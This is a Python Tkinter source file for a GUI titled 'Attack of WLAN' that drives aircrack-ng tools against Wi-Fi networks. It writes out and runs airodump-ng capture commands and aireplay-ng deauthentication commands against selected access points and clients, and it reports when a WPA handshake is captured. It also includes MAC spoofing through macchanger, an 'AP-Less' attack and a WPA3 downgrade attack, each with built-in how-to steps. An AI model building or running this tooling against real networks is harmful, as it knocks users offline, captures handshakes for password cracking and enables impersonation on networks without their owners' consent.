19/2/2020
#======================
# imports
#======================

import signal
import sys
import tkinter as tk
from tkinter import ttk
from tkinter import scrolledtext
from tkinter import Menu
from tkinter import Spinbox
from tkinter import messagebox as mBox
import threading
import wifiadpater as fypad
import scanningnetwork as sca
import shlex
import time
import configparser
import signal
import threading
import multiprocessing as mp 
import os, subprocess
import shutil
#from PIL import Image, ImageTk
from PIL import Image
from PIL import ImageTk
from itertools import count 
from tkinter.filedialog import askopenfilename
import gif
from tkinter import *
from tkinter.ttk import *
import schedule
import apless
import re
import macspooflist


global versionofdevice
versionofdevice=2

from threading import Timer
#!!!!!!!!!!!!!!!!!!!#
global clientlesspasswordgetflat
clientlesspasswordgetflat=0
global enterflag
enterflag=0
global treeviewmode
treeviewmode=0
global treeviwecount
treeviwecount=0
global s
s=0
global delinkfalag
delinkfalag=0
global applesstreeviwecount
applesstreeviwecount=0
global clienttreeviwecount
clienttreeviwecount=0
global aplessfalag
aplessfalag =0
global macspoofbomtreeviwecount
macspoofbomtreeviwecount=0
global macconnectedtvcount
macconnectedtvcount=0
global macchangerfalag
macchangerfalag=0

#!!!!!!!!!!!!!!!!!!!#
def runmacspoofingpy():
    print("start run ")
    os.system("python3.7 macspoofing.py")





main=tk.Tk()

style = ttk.Style()

style.layout('TNotebook.Tab', [])


main.title("Attack of WLAN")


tabControl = ttk.Notebook(main)          # Create Tab Control
 
tab1 = ttk.Frame(tabControl)#0           # Create a tab #0
tabControl.add(tab1, text='wifi adpater')      # Add the tab


tab2 = ttk.Frame(tabControl)#1            # Add a second tab#1
tabControl.add(tab2, text='DE-LINK')      # Make second tab visible
 
tab3 = ttk.Frame(tabControl)#2            # Add a third tab#2
tabControl.add(tab3, text='APless')      # Make second tab visible

tab9 = ttk.Frame(tabControl)#3                # Add a third tab#3
tabControl.add(tab9, text='Attack way')      # Make second tab visible

tab2run = ttk.Frame(tabControl)#4            # Add a third tab#4
tabControl.add(tab2run, text='DE-LINK attack') # Make second tab visible

loadpage = ttk.Frame(tabControl)#5            # loading #5
tabControl.add(loadpage, text='loading')

macspoof = ttk.Frame(tabControl)#6            # mac spoofing #6
tabControl.add(macspoof, text='mac spoofing')

clentless = ttk.Frame(tabControl)#7            # clentless #7
tabControl.add(clentless, text='clentless')

intro = ttk.Frame(tabControl)#8           # clentless #7
tabControl.add(intro, text='intro')




successtab = ttk.Frame(tabControl)#9           # success #8
tabControl.add(successtab, text='success')

macpage = ttk.Frame(tabControl)#10          # clentless #9
tabControl.add(macpage, text='macpage')


tabControl.pack(expand=1, fill="both")  # Pack to make visible

#@@@@@@@@@@@@@@@@introduation TAB@@@@@@@@@@@@@@@@@@@@#

introtab = ttk.Notebook(intro)          # Create Tab Control
 
introdelink = ttk.Frame(introtab)#0           # Create a tab #0
introtab.add(introdelink, text='De-Link')

introapless = ttk.Frame(introtab)#0           # Create a tab #0
introtab.add(introapless,text='AP-Less')

intromacspoof = ttk.Frame(introtab)#0           # Create a tab #0
introtab.add(intromacspoof, text='Mac-Spoofing') 

introtab.pack(expand=1, fill="both")

###############

introwlanlabel = ttk.Label(introdelink, text='How to use De-Link ', font=("Helvetica", 20))
introwlanlabel.grid(column=0, row=1, padx=1, pady=1)

introlbl = gif.ImageLabel(introdelink)
introlbl.grid(column=0, row=2, padx=8, pady=4)
introlbl.load('delink3.gif')

def hidebuttondelink():
    global delinkvalid
    if delinkvalid==0:
        introlbl.grid_forget()
        delinkintro2.grid(column=0, row=2, padx=1, pady=1)
        delinkintro.grid(column=0, row=1, padx=1, pady=1)
        delinkintro3.grid(column=0, row=3, padx=1, pady=1)
        
        delinkvalid=delinkvalid+1
    else:
        introlbl.grid()
        delinkintro2.grid_forget()
        delinkintro3.grid_forget()
        delinkintro.grid_forget()
        delinkvalid=delinkvalid-1

introdelinkbutton = ttk.Button(introdelink, text='show on text' ,command=lambda: hidebuttondelink())
introdelinkbutton.grid(column=0, row=0, padx=1, pady=1)

delinkintro = ttk.Label(introdelink, text='1.click De-Link button', font=("Helvetica", 20))
delinkintro2 = ttk.Label(introdelink, text='2.select the AP and station on bottom table.', font=("Helvetica", 20))
delinkintro3 = ttk.Label(introdelink, text='3.doubleclick the selected bar for Deauthentication attack', font=("Helvetica", 20))

#########

aplessgif = gif.ImageLabel(introapless)
aplessgif.grid(column=0, row=2, padx=8, pady=4)
aplessgif.load('apless2.gif')

global aplessvalid
aplessvalid = 0
def hidebuttonapless():
    global aplessvalid
    if aplessvalid==0:
        aplessgif.grid_forget()
        aplessintro.grid(column=0, row=1, padx=1, pady=1)
        aplessintro1.grid(column=0, row=2, padx=1, pady=1)
        aplessintro2.grid(column=0, row=3, padx=1, pady=1)
        
        aplessvalid=aplessvalid+1
    else:
        aplessgif.grid()
        aplessintro.grid_forget()
        aplessintro1.grid_forget()
        aplessintro2.grid_forget()
        aplessvalid=aplessvalid-1

introaplessbutton = ttk.Button(introapless, text='show on text' ,command=lambda: hidebuttonapless())
introaplessbutton.grid(column=0, row=0, padx=1, pady=1)


introaplesslabel = ttk.Label(introapless, text='How to use AP-Less', font=("Helvetica", 20))
introaplesslabel.grid(column=0, row=1, padx=1, pady=1)

aplessintro = ttk.Label(introapless, text='1.click AP-Less button', font=("Helvetica", 20))
aplessintro1 = ttk.Label(introapless, text='2.select the target AP on table.', font=("Helvetica", 20))
aplessintro2 = ttk.Label(introapless, text='3.doubleclick the selected bar for AP-Less attack', font=("Helvetica", 20))



##########################
macspoofgif = gif.ImageLabel(intromacspoof)
macspoofgif.grid(column=0, row=2, padx=8, pady=4)
macspoofgif.load('macspoofing.gif')

global macvalid
macvalid=0
def hidebuttonmacspoofgif():
    global macvalid
    if macvalid==0:
        macspoofgif.grid_forget()
        macintro.grid(column=0, row=1, padx=1, pady=1)
        macintro1.grid(column=0, row=2, padx=1, pady=1)
        macintro2.grid(column=0, row=3, padx=1, pady=1)
        
        macvalid=macvalid+1
    else:
        aplessgif.grid()
        macintro.grid_forget()
        macintro1.grid_forget()
        macintro2.grid_forget()
        macvalid=macvalid-1

macbutton = ttk.Button(intromacspoof, text='show on text' ,command=lambda: hidebuttonmacspoofgif())
macbutton.grid(column=0, row=0, padx=1, pady=1)


macspooflabel = ttk.Label(intromacspoof, text='How to use MAC-Spoofing', font=("Helvetica", 20))
macspooflabel.grid(column=0, row=1, padx=1, pady=1)

macintro = ttk.Label(intromacspoof, text='1.click De-Link button', font=("Helvetica", 20))
macintro1 = ttk.Label(intromacspoof, text='2.select the target AP on top table .', font=("Helvetica", 20))
macintro2 = ttk.Label(intromacspoof, text='1.doubleclick the selected bar for MAC Spoofing', font=("Helvetica", 20))




















# ~ Tab Control introduced here -----------------------------------------
#@@@@@@@@@@@@@@@@@@BACK BUTTON@@@@@@@@@@@@@@@@@@@@@@@@#
#Attack way to wifi adpater
def backtab1():
    tabControl.tab(0, state="normal")
    tabControl.select(tab1)  
    tabControl.tab(3, state="disabled")
backtab1but=ttk.Button(tab9, text='back',command=backtab1)
backtab1but.grid(column=5, row=1, padx=8, pady=4)
#DE-LINK attack to DE-LINK
def backtab2():
    tabControl.tab(1, state="normal")
    tabControl.select(tab2)  
    tabControl.tab(4, state="disabled")
backtab2but=ttk.Button(tab2run, text='back',command=backtab2)
backtab2but.grid(column=5, row=0, padx=8, pady=4)
#APless attack to Attack way
def backtab3():
    tabControl.tab(3, state="normal")
    tabControl.select(tab9)  
    tabControl.tab(2, state="disabled")
backtab3but=ttk.Button(tab3, text='back',command=backtab3)
backtab3but.grid(column=5, row=0, padx=8, pady=4)
#DE-LINK to Attack way
def backtab9():
    global delinkfalag
    delinkfalag=1
    tabControl.tab(3, state="normal")
    tabControl.select(tab9)  
    tabControl.tab(1, state="disabled")
backtab9but=ttk.Button(tab2, text='back',command=backtab3)
backtab9but.grid(column=5, row=0, padx=8, pady=4)
#mac spoofing to Attack way
def macback():
    tabControl.tab(1, state="normal")
    tabControl.select(tab9)  
    tabControl.tab(6, state="disabled")
macbackbut=ttk.Button(macpage, text='back',command=macback)
macbackbut.grid(column=5, row=0, padx=8, pady=4)
#client to Attackway
def clientback():
    tabControl.tab(3, state="normal")
    tabControl.select(tab9) 
    tabControl.tab(7, state="disabled")
clientbackbut=ttk.Button(clentless, text='back',command=clientback)
clientbackbut.grid(column=5, row=0, padx=8, pady=4)

def successback():
    tabControl.tab(3, state="normal")
    tabControl.select(tab9) 
    tabControl.tab(8, state="disabled")
successbackbut=ttk.Button(successtab, text='back',command=successback)
successbackbut.grid(column=5, row=0, padx=8, pady=4)
#chagemacaddress to Attackway
def macspoofback():
    tabControl.tab(3, state="normal")
    tabControl.select(tab9) 
    tabControl.tab(8, state="disabled")
macspoofbackbut=ttk.Button(macspoof, text='back',command=macspoofback)
macspoofbackbut.grid(column=5, row=0, padx=8, pady=4)


    
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
#---------------Tab1------------------#

# We are creating a container tab3 to hold all other widgets
#tabControl.tab(1, state="disabled")
#tabControl.tab(2, state="disabled")
#tabControl.tab(3, state="disabled")
#tabControl.tab(4, state="disabled")
#tabControl.tab(5, state="disabled")
#tabControl.tab(6, state="disabled")
#tabControl.tab(7, state="disabled")
#tabControl.tab(8, state="disabled")

wlanlabel = ttk.Label(tab1, text='select WIFI adpater')
wlanlabel.grid(column=0, row=1, padx=8, pady=4)



wlanolumns = ("wlan","Driver","Chipset")
wlantv = ttk.Treeview(tab1, height=15, show="headings", columns=wlanolumns)  # 表格

wlantv.column("wlan", width=50, anchor='center') # 表示列,不顯示
wlantv.column("Driver", width=100, anchor='center')
wlantv.column("Chipset", width=400, anchor='center')
            
wlantv.heading("wlan", text="wlan") 
wlantv.heading("Driver", text="Driver") 
wlantv.heading("Chipset", text="Chipset")

wlantv.grid(row=2, column=0, padx=8, pady=4 )

open1=open("/root/Documents/data/wifiadpater.txt","r+")
read= open1.read()
tvwlanadd=read.split("\n")

global selectwlan
for line in tvwlanadd:
    print(line)
    if "phy"in line:
        tvwlanadd=line.split("\t")
        print(tvwlanadd)
        wlan=tvwlanadd[1]
        print(wlan)
        Driver=tvwlanadd[3]
        print(Driver)
        Chipset=tvwlanadd[4]
        print(Chipset)
        wlantv.insert('','end',values=(wlan,Driver,Chipset))

def askingforwayofattack(event):
    def oo():
        a="python3.7 intro.py"

    thread_1 = threading.Thread(target=oo)
    print ("start 2")
    thread_1.start()
    #p=subprocess.Popen(a,shell=True ,stdout=subprocess.PIPE ,stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    
    for item in wlantv.selection():
        item_text = wlantv.item(item,"values")
        selectwlan=item_text[0]
        print(selectwlan)
        selecttxt=open("/root/Documents/data/selected.txt","w+")
        selecttxt.write(item_text[0])
        global selectwaln
        selectwaln=item_text[0]+"mon"
        print (selectwaln)
    
        
        
    tabControl.tab(3, state="normal")
    tabControl.select(tab9)
    tabControl.tab(0, state="disabled")
    


wlantv.bind('<Double-1>', askingforwayofattack)



#---------------#6---------macspoof------------------#
#---------------#6---------macspoof------------------#




def macspoofingbom():
            global mactreeview
            wlanlabel = ttk.Label(macspoof, text='MAC Spoofing AP is '+ macspoofessid )
            wlanlabel.grid(column=0, row=0, padx=8, pady=4)
            wlanlabel.config(font=("Courier", 15))
            columns = ( "Client BSSID","ESSID","STATION","PWR")
            mactreeview = ttk.Treeview(macspoof, height=8, show="headings", columns=columns)  # 表格

            
            
            mactreeview.column("Client BSSID", width=150, anchor='center') # 表示列,不顯示
            mactreeview.column("ESSID", width=100, anchor='center')
            mactreeview.column("STATION", width=150, anchor='center')
            mactreeview.column("PWR", width=100, anchor='center')
            
            



            mactreeview.heading("Client BSSID", text="Client BSSID") # 顯示錶頭
            mactreeview.heading("ESSID", text="ESSID")
            mactreeview.heading("STATION", text="STATION")
            mactreeview.heading("PWR", text="PWR")


            mactreeview.grid(row=2, column=0, columnspan=30, rowspan=10, padx=8, pady=4,sticky=tk.W) 

            global macspoofbomtreeviwecount
            macspoofbomtreeviwecount=int(macspoofbomtreeviwecount)
            if macspoofbomtreeviwecount>0:
                    
                    items = mactreeview.get_children()
                    [mactreeview.delete(item) for item in items]
                    macspoofbomtreeviwecount=macspoofbomtreeviwecount-1
                    print ('clear bom')
            
            open1=open("macbom.txt","rb")
            
            read= open1.read()
            print("check MAC Spoofing ....................................")
            print(read)
            tvlist1=read.decode().split("\n")
            for n in tvlist1:
                    a=str(n)
                    StationMAC=n[3:21]
                    STATION=n[44:62]
                    print(STATION)
                    PWR=n[27:31]
                    check = open("viewtreemaclist.txt","rb")
                    read= check.read()
                    tvlist=read.decode().split("\n")
                    
                    for a in tvlist:
                        
                        BSSID=a[3:21]
                        print("BSSID"+BSSID)
                        
                        
                        if str(BSSID) == str(STATION):
                            print("success")
                            ESSID=a[93:]
                        else:
                            ESSID=" "
                        
                    


                    mactreeview.insert('','end',values=(StationMAC,ESSID,STATION,PWR))
    



            macspoofbomtreeviwecount=macspoofbomtreeviwecount+1





def choosemacclient():
            #os.system("python3.7 macspoofinglist.py")
            global macall
            columns = ( "ESSID","clientBSSID")
            macclient = ttk.Treeview(macspoof, height=8, show="headings", columns=columns)  # 表格

            
            macclient.column("ESSID", width=150, anchor='center')
            macclient.column("clientBSSID", width=150, anchor='center')
            
            macclient.heading("ESSID", text="ESSID")
            macclient.heading("clientBSSID", text="clientBSSID")
            
            macclient.grid(row=12, column=0, columnspan=30, rowspan=10, padx=8, pady=4,sticky=tk.W) 

            global macconnectedtvcount
            macconnectedtvcount=int(macconnectedtvcount)
            if macconnectedtvcount>0:
                    
                    items = macclient.get_children()
                    [macclient.delete(item) for item in items]
                    macconnectedtvcount=macconnectedtvcount-1
                    print ('clear bom')
            
            open1=open("viewtreemaclist.txt","rb")
            read= open1.read()
            print(read)
            tvlist1=read.decode().split("\n")
            for n in tvlist1:
                    ESSID=n[3:22]
                    clientBSSID=n[44:63]
                        
                    


                    macclient.insert('','end',values=(ESSID,clientBSSID))
    



            macconnectedtvcount=macconnectedtvcount+1


            def treeview_sort_column(tv, col, reverse):#Treeview、列名、排列方式
                l = [(tv.set(k, col), k) for k in tv.get_children('')]
                print(tv.get_children(''))
                l.sort(reverse=reverse)#排序方式
                # rearrange items in sorted positions
                for index, (val, k) in enumerate(l):#根据排序后索引移动
                    tv.move(k, '', index)
                    print(k)
                tv.heading(col, command=lambda: treeview_sort_column(tv, col, not reverse))


            macclient.heading('ESSID', text='ESSID', command=lambda: treeview_sort_column(tree, 'ESSID', False))
            





            def macspoofingClick(event):
                    print("start")
                    global selectststion
                    global macchangerfalagopen
                    global macselectwaln
                    print ('单击')
                    for item in macclient.selection():
                            item_text = macclient.item(item,"values")

                            
                            
                            selectststion=item_text[1]
                            
                            
                    
                    selectststion=item_text[1]
                    
                    writemacchanger=open("macchanger.txt","w+")
                    writemacchanger.write("macchanger --mac="+selectststion+" "+macselectwaln)
                    writemacchanger.close()
                    os.system("python3.7 macchanger.py")
                    def stopit():
                        global macchangerfalag
                        macchangerfalag=1
                        print("stop")
                    def rescanloop():
                        if macchangerfalag==0:
                            global macchangerfalagopen
                            macchangerfalagopen=open("macchangerfalag.txt","r+")
                            read2= macchangerfalagopen.read()
                            print(read)
                            tvlist2=read2.split("\n")
                            if tvlist2[0]=="aaa":
                                stopit()
                            
                            main.after(1000,rescanloop)
                        else:
                            tk.messagebox.showinfo('info','MAC address changed')
                            
                            macchangerfalagopen.truncate()
                            macchangerfalagopen.close()
                    rescanloop()
                    
                    
                            
             
            macclient.bind('<Double-1>', macspoofingClick)






            


def enterinstermacspoofingmot():
    global mactreeview
    get=instermacspoofingEntry.get()
    print("done1")
    write=open("macvtconnectedbom.txt","w+")
    write.write(macspoofbssid+get+"-81    0 - 6      0        1")
    write.write("\n")
    write.close()
    print("done2")
    mactreeview.insert('','end',values=(macspoofbssid,get,"None","None","None","None","None"))
    mactreeview.update()
    print("done3")
    


    
instermacspoofingEntry=ttk.Entry(macspoof, show = None)
instermacspoofingEntry.grid(column=0, row=50, padx=8, pady=4)
instermacspoofingEntry.config(font=("Courier", 15))


instermacspoofing=ttk.Label(macspoof, text="add MAC-address to MAC-Spoofing")
instermacspoofing.grid(column=0, row=49, padx=8, pady=4)
instermacspoofing.config(font=("Courier", 15))

enterinstermacspoofing=ttk.Button(macspoof, text="add",command=enterinstermacspoofingmot)
enterinstermacspoofing.grid(column=1, row=49, padx=8, pady=4)



def runtablemacspoof():
    thread_1 = threading.Thread(target=runmacspoofingpy)
    print ("start 2")
    thread_1.start()
    thread_1.join()
    macspoofingbom()
    macspooflist.makelist()







def mactoptreeveiwallnetwork():
    global mactreeviewtop
    topcolumns = ("BSSID","channel","Speed","Privacy","Authentication","beacons","ESSID")
    mactreeviewtop = ttk.Treeview(macpage, height=10, show="headings", columns=topcolumns)  # 表格

    mactreeviewtop.column("BSSID", width=150, anchor='center') # 表示列,不顯示
    mactreeviewtop.column("channel", width=100, anchor='center')
    mactreeviewtop.column("Speed", width=100, anchor='center')
    mactreeviewtop.column("Privacy", width=100, anchor='center')
    mactreeviewtop.column("Authentication", width=100, anchor='center')
    mactreeviewtop.column("beacons", width=100, anchor='center')
    mactreeviewtop.column("ESSID", width=150, anchor='center')
    

    mactreeviewtop.heading("BSSID", text="BSSID") # 顯示錶頭
    mactreeviewtop.heading("channel", text="channel")
    mactreeviewtop.heading("Speed", text="Speed")
    mactreeviewtop.heading("Privacy", text="Privacy")
    mactreeviewtop.heading("Authentication", text="Authentication")
    mactreeviewtop.heading("beacons", text="beacons")
    mactreeviewtop.heading("ESSID", text="ESSID")


    mactreeviewtop.grid(row=2, column=0, columnspan=50, rowspan=10, pady=10,sticky=tk.W)

    global treeviwecount
    treeviwecount=int(treeviwecount)
    if treeviwecount>0:

                        items = mactreeviewtop.get_children()
                        [mactreeviewtop.delete(item) for item in items]
                        treeviwecount=treeviwecount - 1
                        print ('top')
    global treeviewmode
    treeviewmode=int(treeviewmode)
    if treeviewmode==0:
                        open1=open("connecttopdelink.txt","rb")
                        
    else :
                    
                      open1=open("connectmatch.txt","rb")
                      

    read= open1.read()
    tvlist1=read.decode().split("\n")
    for n in tvlist1:
                        a=str(n)
                        BSSID=n[4:21]
                        channel=n[28:31]
                        Speed=n[39:43]
                        Privacy=n[54:63]
                        Authentication=n[75:79]
                        beacons=n[87:91]
                        ESSID=n[93:]
                        
                        mactreeviewtop.insert('','end',values=(BSSID,channel,Speed,Privacy,Authentication,beacons,ESSID))
    treeviwecount=treeviwecount+1



    def macspoofingClick(event):
                    global delinkfalag
                    delinkfalag=1
                    global macspoofch
                    global macspoofessid
                    global macspoofbssid
                    global selectwaln
                    global macselectwaln
                    print ('单击')
                    for item in mactreeviewtop.selection():
                            item_text = mactreeviewtop.item(item,"values")

                            
                            global macspoofbssid
                            macspoofbssid=item_text[0]
                            global macspoofch
                            macspoofch=item_text[1]
                            print("macspoofch"+macspoofch)
                            global macspoofessid
                            macspoofessid=item_text[6]
                    macselectwaln=item_text[6]
                    macspoofbssid=item_text[0]        
                    macspoofessid=item_text[6]
                    print(macspoofessid)
                    runtablemacspoof()
                    choosemacclient()
                    tabControl.tab(6, state="normal")
                    tabControl.select(macspoof)  
                    tabControl.tab(1, state="disabled")
                    print("macspoofch"+macspoofch)
                    witemacspoof=open("macspooftxt.txt","w+")
                    witemacspoof.write("airodump-ng -d "+macspoofbssid+"  -w mac --output-format csv "+selectwaln)
                    witemacspoof.close()
                    os.system("python3.7 macspoofing.py")
                    os.system("python3.7 macspoofinglist.py")
                    runtablemacspoof()
                    choosemacclient()
                    
                    
                            
             
    mactreeviewtop.bind('<Double-1>', macspoofingClick)






mactoptreeveiwallnetwork()



#---------------Tab2---------DE-LINK------------------#
#~~~~~~~~~~~~~~~Tab2~~viewalltable~~~~~~~~~~#
def treeveiwallnetwork():
    global treeviewtop
    topcolumns = ("BSSID","channel","Speed","Privacy","Authentication","beacons","ESSID")
    treeviewtop = ttk.Treeview(tab2, height=10, show="headings", columns=topcolumns)  # 表格

    treeviewtop.column("BSSID", width=150, anchor='center') # 表示列,不顯示
    treeviewtop.column("channel", width=100, anchor='center')
    treeviewtop.column("Speed", width=100, anchor='center')
    treeviewtop.column("Privacy", width=100, anchor='center')
    treeviewtop.column("Authentication", width=100, anchor='center')
    treeviewtop.column("beacons", width=100, anchor='center')
    treeviewtop.column("ESSID", width=150, anchor='center')
    

    treeviewtop.heading("BSSID", text="BSSID") # 顯示錶頭
    treeviewtop.heading("channel", text="channel")
    treeviewtop.heading("Speed", text="Speed")
    treeviewtop.heading("Privacy", text="Privacy")
    treeviewtop.heading("Authentication", text="Authentication")
    treeviewtop.heading("beacons", text="beacons")
    treeviewtop.heading("ESSID", text="ESSID")


    treeviewtop.grid(row=2, column=0, columnspan=50, rowspan=10, pady=10,sticky=tk.W)

    global treeviwecount
    treeviwecount=int(treeviwecount)
    if treeviwecount>0:

                        items = treeviewtop.get_children()
                        [treeviewtop.delete(item) for item in items]
                        treeviwecount=treeviwecount - 1
                        print ('top')
    global treeviewmode
    treeviewmode=int(treeviewmode)
    if treeviewmode==0:
                        open1=open("connecttopdelink.txt","rb")
                        
    else :
                    
                      open1=open("connectmatch.txt","rb")
                      

    read= open1.read()
    tvlist1=read.decode().split("\n")
    for n in tvlist1:
                        a=str(n)
                        BSSID=n[4:21]
                        channel=n[28:31]
                        Speed=n[39:43]
                        Privacy=n[53:63]
                        Authentication=n[74:79]
                        beacons=n[87:91]
                        ESSID=n[92:]
                        
                        treeviewtop.insert('','end',values=(BSSID,channel,Speed,Privacy,Authentication,beacons,ESSID))
    treeviwecount=treeviwecount+1

    def macspoofingClick(event):
                    global delinkfalag
                    delinkfalag=1
                    global macspoofch
                    global macspoofessid
                    global macspoofbssid
                    global selectwaln
                    print ('单击')
                    for item in treeviewtop.selection():
                            item_text = treeviewtop.item(item,"values")

                            
                            global macspoofbssid
                            macspoofbssid=item_text[0]
                            global macspoofch
                            macspoofch=item_text[1]
                            print("macspoofch"+macspoofch)
                            global macspoofessid
                            macspoofessid=item_text[6]
                    
                    macspoofbssid=item_text[0]        
                    macspoofessid=item_text[6]
                    print(macspoofessid)
                    tabControl.tab(6, state="normal")
                    tabControl.select(macspoof)  
                    tabControl.tab(1, state="disabled")
                    print("macspoofch"+macspoofch)
                    witemacspoof=open("macspooftxt.txt","w+")
                    witemacspoof.write("airodump-ng -d "+macspoofbssid+"  -w mac --output-format csv "+selectwaln)
                    witemacspoof.close()
                    os.system("python3.7 macspoofing.py")
                    os.system("python3.7 macspoofinglist")
                    runtablemacspoof()
                    choosemacclient()
                    
                    
                            
             
    #treeviewtop.bind('<Double-1>', macspoofingClick)





treeveiwallnetwork()

#~~~~~~~~~~~~~~~~Tab2~~connectdom~~~~~~~~~~~~#
def scandom():
            
            #treeview bottom show BSSID &STATION#
            global treeview
            columns = ( "Client BSSID","ESSID","STATION","PWR")
            treeview = ttk.Treeview(tab2, height=8, show="headings", columns=columns)  # 表格

            
            treeview.column("Client BSSID", width=150, anchor='center') # 表示列,不顯示
            treeview.column("ESSID", width=150, anchor='center')
            treeview.column("STATION", width=150, anchor='center')
            treeview.column("PWR", width=100, anchor='center')
            
            



            treeview.heading("Client BSSID", text="Client BSSID") # 顯示錶頭
            treeview.heading("ESSID", text="ESSID")
            treeview.heading("STATION", text="STATION")
            treeview.heading("PWR", text="PWR")



            treeview.grid(row=50, column=0, columnspan=30, rowspan=10,sticky=tk.W) 

            global treeviwecount
            treeviwecount=int(treeviwecount)
            if treeviwecount>0:
                    
                    items = treeview.get_children()
                    [treeview.delete(item) for item in items]
                    treeviwecount=treeviwecount-1
                    print ('clear bom')
            
            open1=open("connectbomdelink.txt","rb")
            read= open1.read()
            tvlist1=read.decode().split("\n")
            for n in tvlist1:
                    ESSID=""
                    a=str(n)
                    StationMAC=n[4:21]
                    treeviewSTATION=n[45:62]
                    print(treeviewSTATION)
                    PWR=n[27:31]
                    check = open("connecttopdelink.txt","rb")
                    read= check.read()
                    tvlist=read.decode().split("\n")
                    
                    for a in tvlist:
                        
                        BSSID=a[4:21]
                        print("BSSID"+" |"+BSSID+"|"+str(treeviewSTATION))

                        isspaceBSSID=BSSID.isspace()  
                        print(isspaceBSSID)
                        if str(BSSID) == str(treeviewSTATION):
                            print("success")
                            ESSID=a[93:]
                            print(ESSID)
    
                        

                    
                        
                    


                    treeview.insert('','end',values=(StationMAC,ESSID,treeviewSTATION,PWR))
                    
            def treeviewClick(event):
                    
                    global delinkfalag
                    delinkfalag=1
                    print ('单击')
                    for item in treeview.selection():
                            item_text = treeview.item(item,"values")
                            open1=open("connecttopdelink.txt","r+")
                            read= open1.read()
                            tvlist1=read.split("\n")
                            global delinkairCH
                            for n in tvlist1:
                                print ("priont n "+n)
                                print (item_text[2])
                                strn=str(n)
                                if str(item_text[2]) in strn:
                                    global delinkESSID
                                    delinkESSID=strn[93:]
                                    global delinkairCH
                                    delinkairCH=strn[28:31]
                                    print (delinkESSID)
                                    print("delinkairCH"+delinkairCH)
                                    
                            global delinkstation
                            delinkstation=item_text[0]
                            global testingstation
                            testingstation=item_text[2]
                            #check WPA3
                            opendown=open("connecttopdelink.txt","rb")
                            read= opendown.read()
                            tvlist5=read.decode().split("\n")
                            for n in tvlist5:
                                BSSID=n[4:21]
                                print("1:"+BSSID)
                                print("2:"+testingstation)
                                if str(BSSID) == str(testingstation):
                                    Privacy=n[53:63]
                                    if str("3") in str(Privacy):
                                        tk.messagebox.showinfo('info','Dectected the WAP3 device,will use downgrade attack')
                                        global versionofdevice
                                        versionofdevice="3"
                                        connectbuttonupdate()
                                
                                    
                                    
                                
                            global delinkbssid
                            delinkbssid=item_text[2]
                            
                            report=("report.txt","")
                            #writedelinktxt=open("delink.txt","w+")
                            #writedelinktxt.write(item_text[0]+":"+item_text[1]+":"+airCH+":"+ESSID)
                    tabControl.tab(4, state="normal")
                    tabControl.select(tab2run)  
                    tabControl.tab(1, state="disabled")
                    
                    
                            #askingboxofairplay(item_text[0],item_text[1],airCH,ESSID)
                            #print (item_text[0]+item_text[1])
             
            treeview.bind('<Double-1>', treeviewClick)

scandom()
#-----------------TAB2-------------------------#
#~~~~~~~~~~~~~~~Tab2run~~~~~~~~~~~~~~~~~~~~#
          
lbl = gif.ImageLabel(tab2run)
lbl.grid(column=0, row=1, padx=8, pady=4)
lbl.load('wifi.gif')
#handshake captured
def successofdelink():
    doshandlabel=ttk.Label(tab2run, text="handshake captured")
    doshandlabel.grid(column=0, row=2, padx=8, pady=4)
    doshandlabel.config(font=("Courier", 15))

def image():
    
    tabControl.select(loadpage)  
    
    
def dellink():
            global delinkfalag
            delinkfalag=0
            delinktxtopen=open("delink.txt","w+")
            dostxtopen=open("dos.txt","w+")
            delinkfalagopen1=open("delinkfalag.txt","w+")
            global delinkairCH
            global delinkbssid
            global selectwaln
            def airodump_ch():
                global delinkairCH
                global delinkbssid
                global selectwaln
                en="airodump-ng -c "+ delinkairCH+" --bssid "+delinkbssid+" -w /root/Documents/gui/de-link/  "+ selectwaln 
                print(en)
                delinktxtopen.write(en)                    
                delinktxtopen.close()

                            
            def aireplay_ddos():
                global delinkairCH
                global delinkbssid
                global selectwaln
                e="aireplay-ng -0 20 -a "+ delinkbssid+" -c "+ delinkstation +"  "+ selectwaln
                print(e)
                dostxtopen.write(e)
                dostxtopen.close()
               

            def rundelinkpython():
                print("start airodump_ch")
                airodump_ch()
                print("start aireplay_ddos")
                aireplay_ddos()
                os.system("python3.7 loadinggif.py")
                
                        

             # join for T1
            tabControl.tab(5, state="normal")
            tabControl.select(loadpage)  
            tabControl.tab(4, state="disabled")
            
            #rundelinkpython()
            thread_1 = threading.Thread(target=rundelinkpython)
            print ("start 2")
            thread_1.start()
            def stopit():
                    global delinkfalag
                    delinkfalag=1
                    print("stop")
                    tabControl.select(successtab)
                    tabControl.tab(5, state="disabled")
                    tabControl.tab(8, state="disabled")
                    tk.messagebox.showinfo('info','handshake captured')
                    
            def rescanloop():
                    if delinkfalag==0:
                        delinkfalagopen=open("delinkfalag.txt","r+")
                        read2= delinkfalagopen.read()
                        print(read)
                        tvlist2=read2.split("\n")
                        if tvlist2[0]=="aaa":
                            stopit()
                        
                        main.after(1000,rescanloop)
                    else:
                        
                        delinkfalagopen1.truncate()
                        
            rescanloop() 
           


    #loading=True
    #tabControl.tab(5, state="normal")
    #tabControl.select(loadpage)  
    #tabControl.tab(4, state="disabled")
    #time.sleep(2)
    #loadingbutton.invoke()
    #while loading==True:
        
        #while dosloop_num==0:
 
                                
    
def    connectbuttonupdate():      
    global versionofdevice
    if str(versionofdevice) == str("3"):
        connectbuttonname="Downgrade attack"
        versionofdevice==str("2")
    else:
        connectbuttonname="DE-Link attack"




    connectbutton=ttk.Button(tab2run, text=connectbuttonname,command=dellink)
    connectbutton.grid(column=0, row=0, padx=8, pady=4)
connectbuttonupdate()
#dellink()




#~~~~~~~~~~~~~~~Tab2~~connectbutton~~~~~~~~~#
def changeviewmod():
    global treeviewmode
    if treeviewmode==0:
        treeviewmode=1
        
        
    else:
        treeviewmode=0
    treeveiwallnetwork()
    
    
connectbutton=ttk.Button(tab2, text='change mod ',command=changeviewmod)
connectbutton.grid(column=0, row=0, padx=8, pady=4)


def rescan():
    global delinkfalag
    delinkfalag=1
    
    sca.getall()
    treeveiwallnetwork()
    scandom()
    macspooflist.makelist()
    mactoptreeveiwallnetwork()#update page

connectbutton=ttk.Button(tab2, text='rescan',command=rescan)
connectbutton.grid(column=1, row=0, padx=8, pady=4)

connectbutton=ttk.Button(macpage, text='rescan',command=rescan)
connectbutton.grid(column=1, row=0, padx=8, pady=4)

def scaningloop(event):
    n= scanloop.get()
    if n != "stop": 
        n=int(n)*1000
        
    def stopit():
        global s
        s=1
